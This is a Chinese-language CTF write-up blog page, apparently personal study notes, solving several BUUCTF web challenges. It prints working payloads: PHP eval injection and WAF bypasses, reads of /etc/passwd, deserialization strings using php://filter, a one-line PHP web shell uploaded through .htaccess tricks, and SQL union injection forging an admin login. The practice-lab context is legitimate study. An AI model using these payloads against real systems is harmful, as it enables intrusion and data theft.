@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="odiws">
+
+
+
+
+
+<title>buuctf4月27日 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">buuctf4月27日</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">odiws</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 27, 2024&nbsp;&nbsp;20:59:49</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://img-blog.csdnimg.cn/direct/8d7e93faf78343328ec17a90191c6c8b.png#pic_center" alt="在这里插入图片描述"></h3><p>页面发现什么也没有F12发现有calc.php这个文件，进去发现有源码</p>
+<?php 
+error_reporting(0); 
+if(!isset($_GET['num'])){   
+    show_source(__FILE__); 
+}else{     
+    $str = $_GET['num'];     
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];     
+    foreach ($blacklist as $blackitem) {         
+        if (preg_match('/' . $blackitem . '/m', $str)) {             
+            die("what are you want to do?");         
+        }     
+    }     
+    eval('echo '.$str.';'); 
+} 
+?><p>写num&#x3D;system(‘ls’);发现不允许，首页面有一个提示是有waf保护，</p>
+<p>可能是不能写参数</p>
+<h3 id="知识点1：空格绕过-waf"><a href="#知识点1：空格绕过-waf" class="headerlink" title="知识点1：空格绕过 waf"></a>知识点1：空格绕过 waf</h3><p>在 num 参数前加上一个空格，即：node4.buuoj.cn:29780&#x2F;calc.php? num&#x3D;system(‘ls’);</p>
+<p>返回结果：</p>
+<p>这样服务器会认为传入的参数是 空格num ，而不是 num 。这里用到这种绕过方式是因为假定服务器只对 num 参数做检测，而对于其他参数不做检测。</p>
+<p>当 空格num 参数传入到后端，被 PHP 代码处理时，会被去除多余空格及特殊字符：如空格、制表符、回车换行符以及某些特殊字符等。这样一来仍然是 num 参数了。</p>
+<h4 id="payload-calc-php-num-var-dump-scandir-current-localeconv"><a href="#payload-calc-php-num-var-dump-scandir-current-localeconv" class="headerlink" title="payload:calc.php? num&#x3D;var_dump(scandir(current(localeconv())));"></a>payload:calc.php? num&#x3D;var_dump(scandir(current(localeconv())));</h4><p>查看当前目录下的文件<br>localeconv() 函数返回当前设置的地区的格式化信息，包括货币符号、小数点符号等。它返回一个数组，其中包含了与当前地区相关的格式化参数，该函数返回的第一个元素的值通常是小数点 “.” 。<br>current() 函数用于获取数组中的当前元素的值。在这里，它用于获取 localeconv() 函数返回的数组的第一个元素的值，即一个小数点。<br>scandir() 函数用于获取指定目录中的文件和文件夹列表。它接受一个路径作为参数，并返回一个包含指定目录中所有文件和文件夹的数组。scandir(“.”) 表示获取当前目录下的文件列表。<br>最后使用 var_dump() 函数将该列表输出到页面上。</p>
+<p>但其实这里可以更简单：</p>
+<h4 id="calc-php-num-var-dump-scandir-chr-46"><a href="#calc-php-num-var-dump-scandir-chr-46" class="headerlink" title="calc.php? num&#x3D;var_dump(scandir(chr(46)));"></a>calc.php? num&#x3D;var_dump(scandir(chr(46)));</h4><p>46 是 “.” 的 ASCII 码值，返回结果：</p>
+<p>因为可以有参数嘛。用 chr() 函数将数字变为字符。</p>
+<h4 id="同理查看根目录下的文件：calc-php-num-var-dump-scandir-chr-47"><a href="#同理查看根目录下的文件：calc-php-num-var-dump-scandir-chr-47" class="headerlink" title="同理查看根目录下的文件：calc.php? num&#x3D;var_dump(scandir(chr(47)));"></a>同理查看根目录下的文件：calc.php? num&#x3D;var_dump(scandir(chr(47)));</h4><p>47 是 “&#x2F;” 的 ASCII 码值</p>
+<p><img src="https://img-blog.csdnimg.cn/direct/50e93170372c4fbf9e09ad41d6f5909d.png#pic_center" alt="在这里插入图片描述"></p>
+<p>找到&#x2F;f1aag这个文件</p>
+<p>查看 &#x2F;f1agg 文件</p>
+<h4 id="num-file-get-contents-chr-47-chr-102-chr-49-chr-97-chr-103-chr-103"><a href="#num-file-get-contents-chr-47-chr-102-chr-49-chr-97-chr-103-chr-103" class="headerlink" title="num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));"></a>num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</h4><h3 id="知识点2-file-get-contents-函数"><a href="#知识点2-file-get-contents-函数" class="headerlink" title="知识点2.file_get_contents() 函数"></a>知识点2.file_get_contents() 函数</h3><p>把整个文件读入一个字符串中。</p>
+<p>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</p>
+<p>分别是 ‘&#x2F;’ ‘f’ ‘1’ ‘a’ ‘g’ ‘g’ 的 ASCII 值转字符，‘.’ 用作字符串连接。每一个 chr() 函数返回的结果由于是字符，所以自带了一对引号，不需要额外再加。</p>
+<p><img src="https://img-blog.csdnimg.cn/direct/7aacafeccdf94541a6b70abbb639c728.png#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="知识点3-url溢出"><a href="#知识点3-url溢出" class="headerlink" title="知识点3.url溢出"></a>知识点3.url溢出</h3><p>? num&#x3D;1;eval(end(pos(get_defined_vars())))&amp;nss&#x3D;phpinfo();&amp;</p>
+<p>get_defined_vars()：返回由所有已定义变量所组成的数组，会返回 _GET , _POST , _COOKIE , _FILES 全局变量的值，返回数组顺序为 get-&gt;post-&gt;cookie-&gt;files 。</p>
+<p>current()：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回 $_GET 变量的数组值。</p>
+<p>end() : 将内部指针指向数组中的最后一个元素，并输出。即新加入的参数 nss 。</p>
+<p>最后由 eval() 函数执行，使得 get 方式的参数 nss 生效。</p>
+<p>这样的话就可以再利用 nss 传参了，由于代码只对 num 参数的值做了过滤，因此 nss 参数理论上可以造成任意代码执行。</p>
+<p>这样可以看到phpinfo，找到disable_function函数</p>
+<h4 id="查看-etc-passwd-文件"><a href="#查看-etc-passwd-文件" class="headerlink" title="查看 &#x2F;etc&#x2F;passwd 文件"></a>查看 &#x2F;etc&#x2F;passwd 文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;eval(end(pos(get_defined_vars())))&amp;nss=include(&quot;/etc/passwd&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<p><img src="https://img-blog.csdnimg.cn/direct/3e1382cdd0e14e2ab9a8582e68920b4f.png#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="知识点4-http请求走私"><a href="#知识点4-http请求走私" class="headerlink" title="知识点4.http请求走私"></a>知识点4.http请求走私</h3><p><img src="https://img-blog.csdnimg.cn/direct/da31f71647244b56aad12e09678180b5.png#pic_center" alt="在这里插入图片描述"></p>
+<p>大致原理就是使用了两个 Content-Length 头，使得前端无法识别，直接将整个包完全发给了后端。但这样还是要接受后端的黑名单过滤，所以 num 传参还是不能为所欲为。</p>
+<h2 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a>[HCTF 2018]admin 1</h2><p><strong>第一种解法：密码爆破-尝试弱口令</strong></p>
+<p>[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/121294915">HCTF 2018]admin1_[hctf 2018]admin 1-CSDN博客</a></p>
+<p>三种方法不太理解。</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="C:\Users\86182\assets\image-20240426180112007.png" alt="image-20240426180112007"></h3><h4 id="1-先要把“welcome-to-the-zjctf”从-text中读出来"><a href="#1-先要把“welcome-to-the-zjctf”从-text中读出来" class="headerlink" title="1.先要把“welcome to the zjctf”从$text中读出来"></a>1.先要把“welcome to the zjctf”从$text中读出来</h4><p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
+<p>2.$file不能是含有flag,有一个文件include()函数可以先写php伪协议读一下，（因为password还不知道要干嘛，password有unserialize(),可以初步判断是反序列化，直接输出，可以看出是__tostring函数这个魔术方法（将这个对象当成字符串输出））</p>
+<p>3.&lt;?php  </p>
+<p>class Flag{  &#x2F;&#x2F;flag.php<br>    public $file;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ”);<br>        }<br>    }<br>}<br>?&gt; useless.php里的文件内容，可以发现是一个对象，可以用password&#x3D;<em>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</em> </p>
+<p>绕过</p>
+<p>最后的payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><img src="C:\Users\86182\assets\image-20240426182327414.png" alt="image-20240426182327414"></p>
+<p>I put something in F12 for you<br>include ‘flag.php’;<br>$flag&#x3D;’MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}’;<br>if(isset($_GET[‘gg’])&amp;&amp;isset($_GET[‘id’])) {<br>    $id&#x3D;$_GET[‘id’];<br>    $gg&#x3D;$_GET[‘gg’];<br>    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) {<br>        echo ‘You got the first step’;<br>        if(isset($_POST[‘passwd’])) {<br>            $passwd&#x3D;$_POST[‘passwd’];<br>            if (!is_numeric($passwd))<br>            {<br>                 if($passwd&#x3D;&#x3D;1234567)<br>                 {<br>                     echo ‘Good Job!’;<br>                     highlight_file(‘flag.php’);<br>                     die(‘By Retr_0’);<br>                 }<br>                 else<br>                 {<br>                     echo “can you think twice??”;<br>                 }<br>            }<br>            else{<br>                echo ‘You can not get it !’;<br>            }</p>
+<pre><code>    &#125;
+    else&#123;
+        die(&#39;only one way to get the flag&#39;);
+    &#125;
+</code></pre>
+<p>}<br>    else {<br>        echo “You are not a real hacker!”;<br>    }<br>}<br>else{<br>    die(‘Please input first’);<br>}<br>}Please input first<br>三个参数：gg&amp;&amp;id&amp;&amp;passwd,第一二个是数组绕过（因为是强相等）</p>
+<p>passwd是弱比较（1234567qhwjhiquwf）获得flag</p>
+<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><p>在反序列化的过程中，调用__destruct析构方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function  __destruct() &#123;  </span><br><span class="line">if($this-&gt;op === &quot;2&quot;)   </span><br><span class="line">$this-&gt;op = &quot;1&quot;;  </span><br><span class="line">$this-&gt;content = &quot;&quot;;</span><br><span class="line">$this-&gt;process();&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public  function` `process() &#123;</span><br><span class="line">  if($this-&gt;op == &quot;1&quot;) &#123;</span><br><span class="line">    $this-&gt;write();</span><br><span class="line">  &#125; else if($this-&gt;op == &quot;2&quot;) &#123;</span><br><span class="line">    $res= $this-&gt;read();</span><br><span class="line">    $this-&gt;output($res);</span><br><span class="line">  &#125; else&#123;</span><br><span class="line">    $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看代码可以看出来，GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。</p>
+<p>如果op&#x3D;&#x3D;&#x3D;”2”，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较</p>
+<p>进入process函数后，如果op&#x3D;&#x3D;”1”，则进入write函数，若op&#x3D;&#x3D;”2”，则进入read函数，否则输出报错，可以看出来这里op与字符串的比较变成了弱类型比较&#x3D;&#x3D;。</p>
+<p>所以我们只要令op&#x3D;2,这里的2是整数int。当op&#x3D;2时，op&#x3D;&#x3D;&#x3D;”2”为false，op&#x3D;&#x3D;”2”为true，接着进入read函数</p>
+<p>整个利用思路就很明显了，还有一个需要注意的地方是，$op,$filename,$content三个变量权限都是protected，而</p>
+<h4 id="protected权限的变量在序列化的时会有-00-00字符，"><a href="#protected权限的变量在序列化的时会有-00-00字符，" class="headerlink" title="protected权限的变量在序列化的时会有%00*%00字符，"></a>protected权限的变量在序列化的时会有%00*%00字符，</h4><p>%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p>
+<p><img src="https://img2020.cnblogs.com/blog/1828215/202005/1828215-20200512095733036-1748012487.png" alt="img"></p>
+<p>在这里有几种绕过的方式，简单的一种是：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p>
+<p>paylaod:?str&#x3D;O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php%22;s:7:%22content%22;N;}</p>
+<p> 比赛的时候还有相对路径和绝对路径的问题，需要拿到绝对路径才能读取flag</p>
+<p>可以先尝试读取&#x2F;etc&#x2F;passwd检验自己的payload是否正确，然后再读取服务器上的配置文件，猜出flag.php所在的绝对路径，再将其读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:60:%22php://filter/read=convert.base64-encode/resource=/etc/passwd%22;s:7:%22content%22;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>　　下面这个payload是比赛的时候用的，buuoj上环境路径不一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:``//82f3c803-c285-4d4c-846c-59d240b730e0.node3.buuoj.cn/?str=O:11:%22FileHandler%22:3:&#123;s:2:%22op%22;i:2;s:8:%22filename%22;s:67:%22php://filter/read=convert.base64-encode/resource=/web/html/flag.php%22;s:7:%22content%22;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="C:\Users\86182\assets\image-20240426201402591.png" alt="image-20240426201402591"></h3><p>1.<img src="https://img-blog.csdnimg.cn/2021070719261872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNzAyOTgx,size_16,color_FFFFFF,t_70"></p>
+<p>2.先写一下.htaccess和user.ini两个配置文件，会发现</p>
+<p><img src="C:\Users\86182\assets\image-20240426202003132.png" alt="image-20240426202003132"></p>
+<p>所以要改一下，SetHandler application&#x2F;x-httpd-php这样写</p>
+<h4 id="3-要改Content-Type-image-jpeg是图片的样式，application-octet-stream是php样式。"><a href="#3-要改Content-Type-image-jpeg是图片的样式，application-octet-stream是php样式。" class="headerlink" title="3.要改Content-Type:image&#x2F;jpeg是图片的样式，application&#x2F;octet-stream是php样式。"></a>3.要改Content-Type:image&#x2F;jpeg是图片的样式，application&#x2F;octet-stream是php样式。</h4><p>4.过滤&lt;?可以用JS辅助写一句话木马</p>
+<script language="php">@eval($_POST[aaa]);</script>
+
+<p>蚁剑连接查看。</p>
+<h2 id="BUUCTF-GXYCTF2019-BabySQli-1"><a href="#BUUCTF-GXYCTF2019-BabySQli-1" class="headerlink" title="BUUCTF [GXYCTF2019]BabySQli 1"></a>BUUCTF [GXYCTF2019]BabySQli 1</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/6a38d3e45f32eceef1727c3a2b07aea9.png" alt="image.png"></p>
+<p>burp抓包：初看应该是sql注入</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/87b8cc9d7c33f114c34c155c5bfe169c.png" alt="image.png"></p>
+<p>找到隐藏信息，双重加密，base32解码后再base64解码，</p>
+<p>得到 select * from user where username &#x3D; ‘$name’</p>
+<p>找到注入点，可以知道$name是参数，并且就是第一个输入的值</p>
+<p>万能钥匙不能直接进去，换成0‘ ||TRUE#不能用（显示密码错误） 换个角度，联合注入1’‘ unoin select 1,2#发现报错列数错了加一个1’‘ unoin select 1,2,3#显示wrong user一个一个试将那个$name&#x3D;数组的那个</p>
+<p>发现是第二个</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7b865fe304a063e64dceb70d90e59afb.png" alt="image.png"></p>
+<p>找到</p>
+<p>if($arr[1] &#x3D;&#x3D; “admin”)</p>
+<p>{ 		if(md5($password) &#x3D;&#x3D; $arr[2])</p>
+<p>​                   { 			echo $flag; 		} 		</p>
+<p>​             else{ 			die(“wrong pass!”); 		} 	}</p>
+<p>换种方式猜测<br>username数据表里面的3个字段分别是flag、name、password。<br>猜测只有password字段位NULL<br>咱们给参数password传入的值是123<br>那么传进去后，后台就会把123进行md5值加密并存放到password字段当中<br>当我们使用查询语句的时候<br>我们pw参数的值会被md5值进行加密<br>然后再去与之前存入password中的md5值进行比较<br>如果相同就会输出flag</p>
+<p>爆flag：</p>
+<p>这里pw参数的值为123456<br>可以随便传<br>但是要对传入的那个值进行md5值加密<br>网上可以随便找一个在线md5加密平台</p>
+<p>1’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’#<br>123456<br>       [GYCTF2020]Blacklist 1</p>
+<p><img src="C:\Users\86182\assets\image-20240426210530825.png" alt="image-20240426210530825"></p>
+<p>注入点尝试1’出错了就是‘</p>
+<p>union select发现正则匹配select被过滤，直接双写看看可以不可以，发现不可以</p>
+<h3 id="知识点：Handler语法"><a href="#知识点：Handler语法" class="headerlink" title="知识点：Handler语法"></a>知识点：Handler语法</h3><p>handler语句，一行一行的浏览一个表中的数据</p>
+<p>handler语句并不具备select语句的所有功能。</p>
+<p>mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
+<p>1、HANDLER tbl_name OPEN</p>
+<p>打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。</p>
+<p>2、HANDLER tbl_name READ FIRST</p>
+<p>获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。</p>
+<p>3、HANDLER tbl_name CLOSE</p>
+<p>关闭打开的句柄。</p>
+<p>4、HANDLER tbl_name READ index_name &#x3D; value</p>
+<p>通过索引列指定一个值，可以指定从哪一行开始,通过NEXT继续浏览。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>odiws</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://odiws.github.io/2024/04/27/buuctf%204%E6%9C%8827%E6%97%A5/">http://odiws.github.io/2024/04/27/buuctf%204%E6%9C%8827%E6%97%A5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/buuctf/"># buuctf</a>
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2024/04/28/buuctf4%E6%9C%8829%E6%97%A5/">buuctf4月29日</a>
+            
+            
+            <a class="next" rel="next" href="/2024/03/31/xss%E7%AC%94%E8%AE%B0/">xss漏洞学习笔记</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© odiws | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
